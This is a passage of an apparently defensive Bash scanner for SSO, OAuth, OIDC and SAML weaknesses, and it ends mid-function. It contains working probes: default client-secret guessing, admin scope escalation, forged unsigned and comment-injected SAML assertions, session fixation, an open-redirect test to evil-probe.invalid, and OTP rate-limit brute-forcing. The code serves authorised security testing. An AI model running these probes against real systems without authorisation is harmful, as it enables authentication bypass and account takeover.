        resp=$(_curl -s -X POST "$token_ep" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials&client_id=${client_id}&client_secret=${sec}" || true)
        if echo "$resp" | grep -qi "access_token"; then
            _SUMMARY_TOKEN=1
            emit_finding "critical" \
                "OAuth Token Endpoint — Default client_secret '${sec}' Accepted (${ip}:${port})" \
                "The token endpoint issued an access_token for client_credentials grant using the default/guessable secret '${sec}'. Weak or default client secrets allow unauthenticated attackers to obtain valid access tokens." \
                "Rotate the compromised client_secret immediately. Enforce minimum secret length (≥32 random bytes). Store secrets using bcrypt/argon2 and audit all registered client credentials for default or weak values." \
                "ev-23-${ip//./_}-t03-default-secret"
            echo "[T03] DEFAULT SECRET HIT: ${sec} → access_token issued" >> "$evfile"
            break
        fi
        _tier_sleep
    done

    # ── Probe 3: Token introspection endpoint exposure ────────────────────────
    local -a introspect_eps=(
        "/oauth/introspect" "/token/introspect" "/oauth/token/info"
        "/connect/introspect" "/api/oauth/introspect" "/v1/oauth/introspect"
    )
    for ep in "${introspect_eps[@]}"; do
        code=$(_curl -o /dev/null -w "%{http_code}" -X POST "${base_url}${ep}" \
            -d "token=probe_token_123" || true)
        echo "[T03] introspect ${ep} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|400|401)$ ]]; then
            resp=$(_curl -s -X POST "${base_url}${ep}" -d "token=probe_token_123" || true)
            echo "[T03] introspect response: ${resp:0:200}" >> "$evfile"
            if echo "$resp" | grep -qi '"active"'; then
                emit_finding "medium" \
                    "OAuth Token Introspection Endpoint Exposed Without Authentication (${ip}:${port})" \
                    "The token introspection endpoint at ${ep} responded without requiring client authentication. Unauthenticated introspection allows any party to verify token validity, enumerate token metadata, and probe active sessions." \
                    "Require client authentication (client_id + client_secret or mTLS) on the introspection endpoint. Restrict introspection to registered resource servers only. Log all introspection requests for anomaly detection." \
                    "ev-23-${ip//./_}-t03-introspect"
                break
            fi
        fi
    done
    _tier_sleep

    # ── Probe 4: Scope escalation via parameter injection ────────────────────
    if [[ -n "${BEARER_TOKEN:-}" ]]; then
        resp=$(_curl -s -X POST "$token_ep" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Authorization: Bearer ${BEARER_TOKEN}" \
            -d "grant_type=refresh_token&scope=admin+openid+profile&client_id=${client_id}" || true)
        echo "[T03] scope escalation (scope=admin) → ${resp:0:200}" >> "$evfile"
        if echo "$resp" | grep -qi '"scope".*admin'; then
            _SUMMARY_TOKEN=1
            emit_finding "high" \
                "OAuth Scope Escalation — admin Scope Granted via Token Refresh (${ip}:${port})" \
                "The token endpoint granted an admin scope that was not present in the original token when a scope escalation attempt was made during token refresh. This allows a low-privilege client to elevate its permissions by injecting higher-privilege scopes into the refresh flow." \
                "Enforce that the scopes returned in a refreshed token cannot exceed the scopes originally granted. Validate the requested scope against the original authorization grant on every token refresh. Log scope downgrade/upgrade events for audit." \
                "ev-23-${ip//./_}-t03-scope-escalation"
        fi
    fi

    [[ "${_SUMMARY_TOKEN:-0}" -eq 0 ]] && log_ok "T03: No token endpoint weaknesses found in automated probes"
}

# =============================================================================
# MRK:10_T04 — T04 OIDC PROBES | t04,oidc,jwks,nonce,issuer | L723-804
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t04_oidc() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t04-oidc" "txt")"
    log "T04: OIDC-Specific Probes — ${base_url}"

    {
        echo "[T04] OIDC probes — ${base_url}"
        echo "[T04] Date: $(date)"
        echo ""
    } > "$evfile"

    # ── JWKS endpoint exposure ─────────────────────────────────────────────────
    local -a jwks_eps=(
        "/.well-known/jwks.json"
        "/oauth/discovery/keys"
        "/connect/discovery/keys"
        "/.well-known/openid-configuration/jwks"
        "/api/oauth/jwks"
        "/identity/.well-known/jwks"
    )
    # Also try endpoint from discovery doc
    if [[ -n "$_OIDC_DISCOVERY_DOC" ]]; then
        local disc_jwks; disc_jwks=$(echo "$_OIDC_DISCOVERY_DOC" | grep -o '"jwks_uri":"[^"]*"' | cut -d'"' -f4 || true)
        [[ -n "$disc_jwks" ]] && jwks_eps+=("$disc_jwks")
    fi

    for ep in "${jwks_eps[@]}"; do
        local url; [[ "$ep" == http* ]] && url="$ep" || url="${base_url}${ep}"
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" || true)
        echo "[T04] JWKS ${ep} → HTTP ${code}" >> "$evfile"
        if [[ "$code" == "200" ]]; then
            local body; body=$(_curl -s "$url" || true)
            echo "[T04] JWKS body (first 400 bytes): ${body:0:400}" >> "$evfile"
            # Check for algorithm confusion risk (supports both RS256 and HS256)
            if echo "$body" | grep -qi '"kty"'; then
                local key_count; key_count=$(echo "$body" | grep -o '"kty"' | wc -l || true)
                emit_finding "info" \
                    "OIDC JWKS Endpoint Exposed — ${key_count} Key(s) (${ip}:${port})" \
                    "The JWKS endpoint at ${ep} is publicly accessible and returned ${key_count} signing key(s). Exposed JWKS data enables attackers to study the key algorithms in use and attempt algorithm confusion attacks (e.g. RS256→HS256 downgrade using the public key as the HMAC secret)." \
                    "Restrict JWKS endpoint access to registered resource servers where feasible. Ensure JWT libraries enforce the algorithm specified in the JWKS and ignore the alg header from tokens. Rotate signing keys regularly and maintain key versioning via kid parameter." \
                    "ev-23-${ip//./_}-t04-jwks"
                break
            fi
        fi
    done
    _tier_sleep

    # ── UserInfo endpoint probes ───────────────────────────────────────────────
    local userinfo_ep=""
    if [[ -n "$_OIDC_DISCOVERY_DOC" ]]; then
        userinfo_ep=$(echo "$_OIDC_DISCOVERY_DOC" | grep -o '"userinfo_endpoint":"[^"]*"' | cut -d'"' -f4 || true)
    fi
    [[ -z "$userinfo_ep" ]] && userinfo_ep="${base_url}/oauth/userinfo"

    local ucode; ucode=$(_curl -o /dev/null -w "%{http_code}" "$userinfo_ep" || true)
    echo "[T04] userinfo (no auth) → HTTP ${ucode}" >> "$evfile"
    if [[ "$ucode" == "200" ]]; then
        local ubody; ubody=$(_curl -s "$userinfo_ep" || true)
        echo "[T04] userinfo body: ${ubody:0:300}" >> "$evfile"
        if echo "$ubody" | grep -qiE '"sub"|"email"|"name"'; then
            emit_finding "high" \
                "OIDC UserInfo Endpoint Returns Data Without Authentication (${ip}:${port})" \
                "The OIDC userinfo endpoint at ${userinfo_ep} returned user profile data without a valid access token. This exposes PII (subject ID, email address, name, etc.) to unauthenticated requests and violates the OIDC specification which requires bearer token authentication." \
                "Require a valid bearer access token on all requests to the userinfo endpoint. Return HTTP 401 with WWW-Authenticate header for unauthenticated requests. Validate token scope includes openid before returning claims." \
                "ev-23-${ip//./_}-t04-userinfo-unauth"
        fi
    fi

    # ── Check if OIDC discovery doc leaks internal endpoints ─────────────────
    if [[ -n "$_OIDC_DISCOVERY_DOC" ]]; then
        if echo "$_OIDC_DISCOVERY_DOC" | grep -qiE 'localhost|127\.0\.0\.1|10\.|192\.168\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[0-1]\.'; then
            emit_finding "medium" \
                "OIDC Discovery Document Leaks Internal Network Addresses (${ip}:${port})" \
                "The OIDC discovery document (.well-known/openid-configuration) contains references to internal network addresses (RFC 1918 ranges or localhost). This reveals internal infrastructure topology and may facilitate SSRF attacks by directing clients to make requests to internal services." \
                "Review all endpoint URLs in the discovery document and ensure they reference only public-facing addresses. Sanitise the discovery document before exposing it publicly. Use a reverse proxy to present a uniform public endpoint." \
                "ev-23-${ip//./_}-t04-discovery-leak"
        fi
    fi

    _tier_sleep
    log_ok "T04: OIDC probe complete"
}

# =============================================================================
# MRK:10_T05 — T05 SAML DISCOVERY | t05,saml,metadata,acs,sso | L805-874
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t05_saml_discovery() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t05-saml-disc" "txt")"
    log "T05: SAML Endpoint Discovery — ${base_url}"
    # Reset per-target SAML state
    _SAML_DETECTED=0
    _SAML_ACS_URL=""
    _SUMMARY_SAML=0

    # If a SAML SSO URL was provided via CLI/conf, treat it as already discovered
    if [[ -n "${SAML_SSO_URL:-}" ]]; then
        _SAML_DETECTED=1
        _SAML_ACS_URL="$SAML_SSO_URL"
        echo "[T05] SAML ACS pre-configured: ${SAML_SSO_URL}" > "$evfile"
    fi

    local -a saml_eps=(
        "/saml/acs"
        "/saml/metadata"
        "/saml/sso"
        "/saml/login"
        "/Saml2/acs"
        "/Saml2/metadata"
        "/sso/saml"
        "/sso/saml2"
        "/auth/saml"
        "/auth/saml/callback"
        "/login/saml"
        "/login/saml/callback"
        "/sp/saml"
        "/idp/sso"
        "/idp/metadata"
        "/api/saml/metadata"
        "/federationmetadata/2007-06/federationmetadata.xml"
        "/adfs/ls"
        "/adfs/metadata/idp/saml20"
    )

    {
        echo "[T05] SAML endpoint discovery — ${base_url}"
        echo "[T05] Date: $(date)"
        echo ""
    } >> "$evfile"

    local found_count=0
    for ep in "${saml_eps[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${ep}" || true)
        if [[ "$code" =~ ^(200|301|302|400|405)$ ]]; then
            echo "[T05] FOUND ${ep} → HTTP ${code}" >> "$evfile"
            (( found_count++ )) || true
            _SAML_DETECTED=1
            _SUMMARY_SAML=1
            # Prefer ACS endpoint for T06
            if [[ -z "$_SAML_ACS_URL" ]] && [[ "$ep" == *"acs"* || "$ep" == *"sso"* || "$ep" == *"login"* ]]; then
                _SAML_ACS_URL="${base_url}${ep}"
            fi
        else
            echo "[T05] miss  ${ep} → HTTP ${code}" >> "$evfile"
        fi
        _tier_sleep
    done

    if [[ "$_SAML_DETECTED" -eq 1 ]]; then
        emit_finding "info" \
            "SAML Endpoints Discovered — ${found_count} Endpoint(s) (${ip}:${port})" \
            "SAML 2.0 endpoints were identified at ${found_count} path(s). SAML implementations require careful configuration of signature validation, XML parsing, and ACS binding. Dedicated SAML assertion probes (T06) should be run in deep profile to assess signature enforcement." \
            "Ensure all SAML endpoints enforce signature validation on both AuthnRequests and Responses. Disable unnecessary SAML bindings (HTTP-Artifact, SOAP). Keep SAML libraries updated to prevent known XML signature vulnerabilities." \
            "ev-23-${ip//./_}-t05-saml-disc"
        log_ok "T05: SAML detected — ${found_count} endpoint(s), ACS: ${_SAML_ACS_URL:-none}"
    else
        log_ok "T05: No SAML endpoints detected"
    fi
}

# =============================================================================
# MRK:10_T06 — T06 SAML ASSERTION PROBES | t06,saml,assertion,signature,wrap | L875-972
# NAV-RULE: read-toc-first; deep-only
# =============================================================================

test_10_t06_saml_probes() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t06-saml-probes" "txt")"
    log "T06: SAML Assertion Probes — ${base_url}"

    if [[ "$_SAML_DETECTED" -eq 0 || -z "$_SAML_ACS_URL" ]]; then
        log_info "T06: No SAML ACS endpoint found — skipping assertion probes"
        echo "[T06] Skipped — no SAML ACS detected" > "$evfile"
        return
    fi

    log_info "T06: Probing ACS: ${_SAML_ACS_URL}"

    {
        echo "[T06] SAML assertion probes — ${_SAML_ACS_URL}"
        echo "[T06] Date: $(date)"
        echo ""
    } > "$evfile"

    local acs_url="$_SAML_ACS_URL"

    # ── Probe 1: Unsigned SAML Response (signature stripping) ─────────────────
    local unsigned_saml; unsigned_saml=$(cat <<'SAML_EOF'
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_probe001" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://probe.invalid</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_assert001" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://probe.invalid</saml:Issuer><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">probe-admin@probe.invalid</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z" Recipient="REPLACE_ACS"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/><saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion></samlp:Response>
SAML_EOF
)
    unsigned_saml="${unsigned_saml//REPLACE_ACS/${acs_url}}"
    local b64_unsigned; b64_unsigned=$(echo -n "$unsigned_saml" | base64 -w 0 2>/dev/null || echo -n "$unsigned_saml" | base64 2>/dev/null || true)
    echo "[T06] Sending unsigned SAML response (base64 len=${#b64_unsigned})" >> "$evfile"

    local resp code
    code=$(_curl -o /dev/null -w "%{http_code}" -X POST "$acs_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "SAMLResponse=${b64_unsigned}&RelayState=probe" || true)
    resp=$(_curl -s -X POST "$acs_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "SAMLResponse=${b64_unsigned}&RelayState=probe" || true)
    echo "[T06] unsigned SAML → HTTP ${code}" >> "$evfile"
    echo "[T06] Response snippet: ${resp:0:400}" >> "$evfile"
    # A 500, 200 redirect to an app page, or any non-error response may indicate acceptance
    if [[ "$code" =~ ^(200|302|303)$ ]] && ! echo "$resp" | grep -qiE "invalid|signature|error|denied|unauthorized|forbidden"; then
        emit_finding "critical" \
            "SAML Signature Not Validated — Unsigned Assertion Accepted (${ip}:${port})" \
            "The SAML ACS endpoint at ${acs_url} returned HTTP ${code} for a crafted unsigned SAML Response without any Signature element. If the IdP processes this assertion, it indicates that XML signature validation is absent or bypassable, allowing an attacker to forge authentication as any user including administrators." \
            "Enable mandatory XML signature validation on all incoming SAML Responses and Assertions. Reject any SAML message that lacks a valid Signature element. Verify signatures against the registered IdP certificate. Consider using signed Assertions in addition to signed Responses. Keep SAML libraries patched against known signature wrapping vulnerabilities." \
            "ev-23-${ip//./_}-t06-unsigned"
    fi
    _tier_sleep

    # ── Probe 2: XML comment injection in NameID ──────────────────────────────
    local comment_saml; comment_saml=$(cat <<'SAML_EOF2'
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_probe002" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://probe.invalid</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_assert002" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://probe.invalid</saml:Issuer><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user<!---->@probe.invalid</saml:NameID></saml:Subject><saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion></samlp:Response>
SAML_EOF2
)
    local b64_comment; b64_comment=$(echo -n "$comment_saml" | base64 -w 0 2>/dev/null || echo -n "$comment_saml" | base64 2>/dev/null || true)
    echo "[T06] Sending comment-injection SAML NameID" >> "$evfile"
    code=$(_curl -o /dev/null -w "%{http_code}" -X POST "$acs_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "SAMLResponse=${b64_comment}&RelayState=probe" || true)
    echo "[T06] comment-injection → HTTP ${code}" >> "$evfile"
    # Just record — definitive exploitation requires a fully signed assertion with this NameID
    if [[ "$code" =~ ^(200|302|303)$ ]]; then
        emit_finding "medium" \
            "SAML ACS Endpoint Processes Malformed Assertions Without Rejection (${ip}:${port})" \
            "The SAML ACS endpoint returned a non-error response (HTTP ${code}) for a malformed assertion containing XML comment injection in the NameID element. While a definitive SAML NameID injection bypass requires a validly signed response, the lack of early rejection suggests the parser may be vulnerable to CVE-2017-11427 style comment-bypass attacks." \
            "Use a SAML library that normalises the NameID before comparison and rejects assertions containing XML comments within identity attributes. Validate the NameID against an allowlist of expected identity formats. Apply the SAML library vendor's latest patches for comment-injection CVEs." \
            "ev-23-${ip//./_}-t06-comment-inject"
    fi
    _tier_sleep

    log_ok "T06: SAML assertion probes complete"
}

# =============================================================================
# MRK:10_T07 — T07 SESSION MANAGEMENT | t07,session,cookie,fixation,entropy | L973-1064
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t07_session() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t07-session" "txt")"
    log "T07: Session Management Checks — ${base_url}"
    _SUMMARY_SESSION=0

    {
        echo "[T07] Session management — ${base_url}"
        echo "[T07] Date: $(date)"
        echo ""
    } > "$evfile"

    # ── Cookie attribute checks ────────────────────────────────────────────────
    local login_paths=("/" "/login" "/signin" "/auth" "/sso" "/oauth/authorize")
    local headers=""
    for path in "${login_paths[@]}"; do
        headers=$(_curl_head "${base_url}${path}" || true)
        if echo "$headers" | grep -qi "Set-Cookie"; then break; fi
    done

    if [[ -n "$headers" ]]; then
        echo "[T07] Response headers captured (${#headers} bytes)" >> "$evfile"
        echo "$headers" >> "$evfile"
        echo "" >> "$evfile"

        # Missing Secure flag
        local cookies_without_secure
        cookies_without_secure=$(echo "$headers" | grep -i "Set-Cookie" | grep -iv ";\s*secure" || true)
        if [[ -n "$cookies_without_secure" ]]; then
            _SUMMARY_SESSION=1
            emit_finding "medium" \
                "Session Cookie Missing Secure Flag (${ip}:${port})" \
                "One or more session cookies are set without the Secure attribute. Without this flag, the cookie will be transmitted over unencrypted HTTP connections, exposing it to network interception attacks. This is especially critical for SSO session tokens which grant access to multiple applications." \
                "Set the Secure flag on all session, CSRF, and SSO-related cookies. Enforce HTTPS-only access to the application. Configure HSTS to prevent HTTP downgrade attacks." \
                "ev-23-${ip//./_}-t07-cookie-secure"
        fi

        # Missing HttpOnly flag
        local cookies_without_httponly
        cookies_without_httponly=$(echo "$headers" | grep -i "Set-Cookie" | grep -iv "httponly" || true)
        if [[ -n "$cookies_without_httponly" ]]; then
            _SUMMARY_SESSION=1
            emit_finding "medium" \
                "Session Cookie Missing HttpOnly Flag (${ip}:${port})" \
                "One or more session cookies lack the HttpOnly attribute. Without HttpOnly, JavaScript can read the cookie value via document.cookie, enabling session token theft through XSS attacks. For SSO tokens this represents a critical risk as token theft grants access to all federated applications." \
                "Set the HttpOnly flag on all session and authentication cookies. Pair with a strict Content-Security-Policy to reduce XSS attack surface. Consider using the __Host- cookie prefix for additional protection." \
                "ev-23-${ip//./_}-t07-cookie-httponly"
        fi

        # Missing SameSite attribute
        local cookies_without_samesite
        cookies_without_samesite=$(echo "$headers" | grep -i "Set-Cookie" | grep -iv "samesite" || true)
        if [[ -n "$cookies_without_samesite" ]]; then
            emit_finding "low" \
                "Session Cookie Missing SameSite Attribute (${ip}:${port})" \
                "One or more session cookies do not specify a SameSite attribute. Without SameSite, cookies are sent on all cross-site requests, enabling CSRF attacks and cross-origin information leakage. For OAuth/SSO flows this is particularly relevant as cross-origin redirects are inherent to the protocol." \
                "Set SameSite=Lax as a minimum for session cookies; use SameSite=Strict where cross-origin POST is not required. For OAuth callback endpoints that must receive cross-origin redirects, evaluate the tradeoff carefully and compensate with CSRF tokens or PKCE state validation." \
                "ev-23-${ip//./_}-t07-cookie-samesite"
        fi

        # Token entropy check — look for suspiciously short session IDs
        local cookie_vals
        cookie_vals=$(echo "$headers" | grep -i "Set-Cookie" | grep -oiE '=[A-Za-z0-9+/=_-]{4,}' | sed 's/^=//' | sort -u || true)
        while IFS= read -r val; do
            if [[ "${#val}" -lt 16 ]]; then
                _SUMMARY_SESSION=1
                emit_finding "high" \
                    "Session Token Appears Low-Entropy — Length ${#val} Characters (${ip}:${port})" \
                    "A session cookie value of only ${#val} characters was detected. Short session tokens are susceptible to brute-force enumeration attacks. OWASP recommends session identifiers with at least 128 bits (16 bytes) of entropy, typically represented as 32+ hex characters or 22+ Base64 characters." \
                    "Generate session tokens using a cryptographically secure PRNG with a minimum of 128 bits of entropy. Use a well-tested session management library rather than implementing custom token generation. Rotate session tokens on privilege escalation and authentication state changes." \
                    "ev-23-${ip//./_}-t07-entropy"
                break
            fi
        done <<< "$cookie_vals"
    else
        echo "[T07] No Set-Cookie headers found at common login paths" >> "$evfile"
        log_info "T07: No session cookies observed — may require authenticated state"
    fi
    _tier_sleep

    # ── Session fixation probe ─────────────────────────────────────────────────
    # Inject a known session value; if the same value is present after login, fixation is possible
    local test_sess="PTORCFIXPROBE00001"
    local pre_cookie="session=${test_sess}"
    local post_headers
    post_headers=$(_curl_head "${base_url}/login" \
        -H "Cookie: ${pre_cookie}" || true)
    echo "[T07] session fixation probe response headers:" >> "$evfile"
    echo "$post_headers" >> "$evfile"
    # If the injected session ID appears in the response cookies unchanged, it may indicate fixation
    if echo "$post_headers" | grep -i "Set-Cookie" | grep -qi "$test_sess"; then
        emit_finding "high" \
            "Potential Session Fixation — Pre-Auth Session Cookie Preserved (${ip}:${port})" \
            "The login endpoint echoed back a session cookie value that was injected in the request. Session fixation allows an attacker to force a victim to use an attacker-chosen session identifier, which the attacker can then use to hijack the authenticated session after the victim logs in." \
            "Regenerate the session identifier upon authentication (login, step-up, privilege change). Never accept a session identifier supplied in the login request as the authenticated session. Use framework-level session management that handles regeneration automatically." \
            "ev-23-${ip//./_}-t07-fixation"
    fi
    _tier_sleep

    [[ "${_SUMMARY_SESSION:-0}" -eq 0 ]] && log_ok "T07: No critical session management issues detected"
}

# =============================================================================
# MRK:10_T08 — T08 SSO LOGOUT & REVOCATION | t08,logout,revoke,signout,redirect | L1065-1148
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t08_logout() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t08-logout" "txt")"
    log "T08: SSO Logout & Token Revocation — ${base_url}"
    _SUMMARY_LOGOUT=0

    {
        echo "[T08] SSO logout and revocation probes — ${base_url}"
        echo "[T08] Date: $(date)"
        echo ""
    } > "$evfile"

    local -a logout_eps=(
        "/logout"
        "/signout"
        "/sign-out"
        "/oauth/logout"
        "/connect/logout"
        "/connect/endsession"
        "/auth/logout"
        "/api/logout"
        "/sso/logout"
        "/idp/logout"
        "/adfs/ls?wa=wsignout1.0"
    )

    local logout_found=""
    for ep in "${logout_eps[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${ep}" || true)
        echo "[T08] ${ep} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|302|303|401)$ ]]; then
            logout_found="${base_url}${ep}"
            echo "[T08] Logout endpoint found: ${logout_found}" >> "$evfile"

            # ── Post-logout open redirect ────────────────────────────────────
            local redirect_params=("post_logout_redirect_uri" "redirect_uri" "returnUrl" "next" "url" "goto")
            for param in "${redirect_params[@]}"; do
                local loc; loc=$(_curl_loc "${base_url}${ep}?${param}=https://evil-probe.invalid" || true)
                echo "[T08] ${ep}?${param}=evil → Location: ${loc}" >> "$evfile"
                if echo "$loc" | grep -qi "evil-probe.invalid"; then
                    _SUMMARY_LOGOUT=1
                    emit_finding "medium" \
                        "Post-Logout Open Redirect via ${param} Parameter (${ip}:${port})" \
                        "The logout endpoint at ${ep} accepted an external URL via the '${param}' parameter and redirected to it after logout. An attacker can craft a logout URL that sends users to a phishing page immediately after they sign out, while they may be in a vulnerable mental state (believing they are on a legitimate page)." \
                        "Enforce an allowlist of permitted post-logout redirect URIs. Reject any post_logout_redirect_uri that is not pre-registered for the requesting client. Default to redirecting to the application homepage if no valid registered URI is provided." \
                        "ev-23-${ip//./_}-t08-logout-redirect"
                    break
                fi
                _tier_sleep
            done
            break
        fi
        _tier_sleep
    done

    # ── Token revocation endpoint probe ──────────────────────────────────────
    local -a revoke_eps=(
        "/oauth/revoke"
        "/token/revoke"
        "/connect/revocation"
        "/oauth/token/revoke"
        "/api/oauth/revoke"
    )
    for ep in "${revoke_eps[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" -X POST "${base_url}${ep}" \
            -d "token=probe_token_000&token_type_hint=access_token" || true)
        echo "[T08] revoke ${ep} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|400|401)$ ]]; then
            echo "[T08] Token revocation endpoint found: ${base_url}${ep}" >> "$evfile"
            emit_finding "info" \
                "OAuth Token Revocation Endpoint Identified (${ip}:${port})" \
                "A token revocation endpoint was detected at ${ep}. Revocation support is positive; however, the endpoint should require client authentication to prevent unauthenticated token revocation (DoS against legitimate sessions) and to ensure only authorised parties can revoke tokens." \
                "Require client authentication on token revocation requests. Log all revocation events. Verify that revoked tokens are immediately invalidated and cannot be re-used at the resource server." \
                "ev-23-${ip//./_}-t08-revoke"
            break
        fi
    done

    # ── Bearer token still valid after logout ────────────────────────────────
    if [[ -n "${BEARER_TOKEN:-}" && -n "$logout_found" ]]; then
        # Trigger logout (best-effort — may need a session cookie)
        _curl -X GET "$logout_found" \
            -H "Authorization: Bearer ${BEARER_TOKEN}" > /dev/null 2>&1 || true

        # Then probe a protected endpoint with the same token
        local -a probe_eps=("/api/me" "/api/user" "/api/profile" "/api/account" "/userinfo" "/oauth/userinfo")
        for pep in "${probe_eps[@]}"; do
            local pcode; pcode=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${pep}" \
                -H "Authorization: Bearer ${BEARER_TOKEN}" || true)
            echo "[T08] post-logout bearer probe ${pep} → HTTP ${pcode}" >> "$evfile"
            if [[ "$pcode" =~ ^(200|201)$ ]]; then
                _SUMMARY_LOGOUT=1
                emit_finding "high" \
                    "Bearer Token Remains Valid After Logout — No Revocation (${ip}:${port})" \
                    "After triggering the logout endpoint, the original bearer token continued to return a successful response (HTTP ${pcode}) at ${pep}. The authorization server is not revoking or invalidating tokens on logout, allowing stolen tokens to remain usable until natural expiry." \
                    "Implement server-side token revocation on logout. Maintain a token blocklist or use short-lived tokens (max 5 minutes) with refresh token rotation. Ensure the logout endpoint calls the token revocation logic for all tokens associated with the session. Publish a revocation endpoint per RFC 7009." \
                    "ev-23-${ip//./_}-t08-token-reuse"
                break
            fi
        done
    fi

    [[ "${_SUMMARY_LOGOUT:-0}" -eq 0 ]] && log_ok "T08: No logout/revocation issues detected in automated probes"
}

# =============================================================================
# MRK:10_T09 — T09 2FA/MFA BYPASS | t09,mfa,2fa,otp,bypass,totp | LXXXX-XXXX
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t09_mfa_bypass() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t09-mfa-bypass" "txt")"
    log "T09: 2FA/MFA Bypass Surface — ${base_url}"
    _SUMMARY_MFA=0
    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    {
        echo "=== T09: 2FA/MFA Bypass Surface ==="
        echo "Target: ${base_url}"
        echo "Date:   $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
        echo ""

        # --- OTP / verification endpoint discovery ---
        echo "--- OTP Endpoint Discovery ---"
        local mfa_ep="" found_ep=0
        local -a mfa_candidates=(
            "${base_url}/api/mfa/verify"
            "${base_url}/api/2fa/verify"
            "${base_url}/api/totp/verify"
            "${base_url}/auth/mfa/verify"
            "${base_url}/auth/2fa/verify"
            "${base_url}/verify-otp"
            "${base_url}/api/auth/otp"
            "${base_url}/api/v1/mfa/verify"
            "${base_url}/api/v2/mfa/verify"
        )
        for ep in "${mfa_candidates[@]}"; do
            local hc
            hc=$(_curl -s -o /dev/null -w "%{http_code}" -X POST "$ep" \
                -H "Content-Type: application/json" \
                -d '{"code":"000000"}' \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
            echo "  ${ep} -> HTTP ${hc}"
            if [[ "$hc" =~ ^(200|201|400|401|403|422)$ ]]; then
                mfa_ep="$ep"
                found_ep=1
                log_info "T09: MFA endpoint candidate found: ${ep} (HTTP ${hc})"
                break
            fi
        done
        [[ $found_ep -eq 0 ]] && echo "  No MFA endpoint responded — skipping brute/manipulation checks"

        # --- Rate-limit brute-force check (6 sequential bad codes) ---
        if [[ $found_ep -eq 1 ]]; then
            echo ""
            echo "--- OTP Rate-Limit / Lockout Probe (6 sequential invalid codes) ---"
            local got429=0 got423=0 final_code="" code_idx
            for code_idx in 111111 222222 333333 444444 555555 666666; do
                local rc
                rc=$(_curl -s -o /dev/null -w "%{http_code}" -X POST "$mfa_ep" \
                    -H "Content-Type: application/json" \
                    -d "{\"code\":\"${code_idx}\"}" \
                    "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
                echo "  code=${code_idx} -> HTTP ${rc}"
                [[ "$rc" == "429" ]] && got429=1
                [[ "$rc" == "423" ]] && got423=1
                final_code="$rc"
            done

            if [[ $got429 -eq 0 && $got423 -eq 0 ]]; then
                _SUMMARY_MFA=1
                emit_finding "MEDIUM" \
                    "MFA OTP — No Rate-Limiting Detected" \
                    "The MFA verification endpoint ${mfa_ep} accepted 6 sequential bad OTP codes without returning HTTP 429 (Too Many Requests) or 423 (Locked). Last response code: ${final_code}. An attacker with a valid session token could brute-force time-based OTP codes (1,000,000 possibilities) without throttling." \
                    "Implement per-session OTP attempt throttling (≤5 attempts), exponential backoff, and account lockout after threshold breaches. Log and alert on excessive MFA failures." \
